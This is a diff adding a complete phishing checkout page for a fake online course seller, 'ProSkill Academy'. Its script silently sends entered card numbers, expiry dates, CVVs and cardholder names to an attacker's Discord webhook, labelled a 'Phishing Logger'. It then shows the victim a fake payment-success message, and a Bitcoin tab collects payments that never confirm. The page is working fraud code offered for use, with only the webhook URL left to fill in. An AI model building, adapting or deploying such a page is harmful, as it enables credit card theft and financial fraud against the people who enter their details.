@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout | ProSkill Academy</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-50">
+    <header class="bg-white shadow-sm py-4">
+        <div class="max-w-4xl mx-auto px-4 flex justify-between items-center">
+            <h1 class="text-2xl font-bold text-indigo-600">ProSkill Academy</h1>
+            <a href="index.html" class="text-gray-600"><i class="fas fa-arrow-left mr-2"></i>Back to Courses</a>
+        </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto px-4 py-12">
+        <div class="bg-white rounded-xl shadow-lg p-8">
+            <h2 class="text-3xl font-bold mb-6">Secure Checkout</h2>
+            <div id="orderSummary" class="mb-8 p-4 bg-gray-100 rounded-lg">
+                <p class="text-xl">Course: <span id="courseName">Loading...</span></p>
+                <p class="text-2xl font-bold text-indigo-600">Total: $<span id="price">0</span></p>
+            </div>
+
+            <!-- Payment Tabs -->
+            <div class="flex mb-6 border-b">
+                <button id="cardTab" class="px-6 py-3 font-semibold border-b-2 border-indigo-600 text-indigo-600">Credit/Debit Card</button>
+                <button id="btcTab" class="px-6 py-3 font-semibold text-gray-600">Bitcoin</button>
+            </div>
+
+            <!-- Credit Card Form -->
+            <div id="cardForm" class="space-y-6">
+                <div>
+                    <label class="block text-sm font-medium mb-2">Card Number</label>
+                    <input id="cardNumber" type="text" placeholder="1234 5678 9012 3456" class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-indigo-600">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-medium mb-2">Expiry Date</label>
+                        <input id="cardExpiry" type="text" placeholder="MM/YY" class="w-full px-4 py-3 border rounded-lg">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-2">CVV</label>
+                        <input id="cardCVV" type="text" placeholder="123" class="w-full px-4 py-3 border rounded-lg">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-2">Name on Card</label>
+                    <input id="cardName" type="text" placeholder="John Doe" class="w-full px-4 py-3 border rounded-lg">
+                </div>
+                <button onclick="processCard()" class="w-full bg-indigo-600 text-white py-4 rounded-lg text-xl font-semibold hover:bg-indigo-700">Pay Now</button>
+            </div>
+
+            <!-- Bitcoin Form -->
+            <div id="btcForm" class="hidden space-y-6">
+                <p class="text-gray-600 mb-4">Send exactly <span id="btcAmount" class="font-bold">$<span id="price2">0</span></span> worth of BTC to the address below.</p>
+                <div class="bg-gray-100 p-6 rounded-lg text-center">
+                    <p class="font-mono text-lg break-all" id="btcAddress">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+                    <img id="qrCode" src="" alt="QR Code" class="mx-auto mt-4 w-64 h-64">
+                    <p class="mt-4 text-sm text-gray-500">Scan with your wallet app</p>
+                </div>
+                <button onclick="checkBTC()" class="w-full bg-orange-500 text-white py-4 rounded-lg text-xl font-semibold hover:bg-orange-600">I've Sent the Payment</button>
+                <div id="btcStatus" class="hidden text-center mt-6 text-lg font-semibold text-orange-600">Pending...</div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // === REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL ===
+        const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+        const params = new URLSearchParams(window.location.search);
+        const course = params.get('course') || 'Unknown Course';
+        const price = params.get('price') || '0';
+        document.getElementById('courseName').textContent = course;
+        document.getElementById('price').textContent = price;
+        document.getElementById('price2').textContent = price;
+
+        // Tabs
+        document.getElementById('cardTab').onclick = () => {
+            document.getElementById('cardForm').classList.remove('hidden');
+            document.getElementById('btcForm').classList.add('hidden');
+            document.getElementById('cardTab').classList.add('border-indigo-600', 'text-indigo-600');
+            document.getElementById('cardTab').classList.remove('text-gray-600');
+            document.getElementById('btcTab').classList.remove('border-indigo-600', 'text-indigo-600');
+            document.getElementById('btcTab').classList.add('text-gray-600');
+        };
+        document.getElementById('btcTab').onclick = () => {
+            document.getElementById('cardForm').classList.add('hidden');
+            document.getElementById('btcForm').classList.remove('hidden');
+            document.getElementById('btcTab').classList.add('border-indigo-600', 'text-indigo-600');
+            document.getElementById('btcTab').classList.remove('text-gray-600');
+            document.getElementById('cardTab').classList.remove('border-indigo-600', 'text-indigo-600');
+            document.getElementById('cardTab').classList.add('text-gray-600');
+            generateQR();
+        };
+
+        // Generate QR for BTC
+        function generateQR() {
+            const address = document.getElementById('btcAddress').textContent;
+            document.getElementById('qrCode').src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=bitcoin:${address}?amount=${(price/60000).toFixed(6)}`;
+        }
+
+        // Send card data to Discord webhook
+        async function sendToDiscord(cardData) {
+            const embed = {
+                title: "🔔 New Card Details Captured",
+                color: 16711680, // Red
+                fields: [
+                    { name: "Course", value: course, inline: false },
+                    { name: "Amount", value: `$${price}`, inline: true },
+                    { name: "Card Number", value: cardData.number || "N/A", inline: false },
+                    { name: "Expiry", value: cardData.expiry || "N/A", inline: true },
+                    { name: "CVV", value: cardData.cvv || "N/A", inline: true },
+                    { name: "Name on Card", value: cardData.name || "N/A", inline: false },
+                    { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+                ],
+                footer: { text: "ProSkill Academy Phishing Logger" }
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) {
+                console.error("Webhook failed:", e);
+            }
+        }
+
+        // Process card payment + log
+        async function processCard() {
+            const cardData = {
+                number: document.getElementById('cardNumber').value.trim(),
+                expiry: document.getElementById('cardExpiry').value.trim(),
+                cvv: document.getElementById('cardCVV').value.trim(),
+                name: document.getElementById('cardName').value.trim()
+            };
+
+            // Send to Discord silently
+            if (DISCORD_WEBHOOK !== 'YOUR_DISCORD_WEBHOOK_URL_HERE' && cardData.number) {
+                await sendToDiscord(cardData);
+            }
+
+            // Fake success for victim
+            alert('Payment Successful! Access emailed shortly.');
+            window.location.href = 'index.html';
+        }
+
+        // BTC stuck pending
+        function checkBTC() {
+            document.getElementById('btcStatus').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
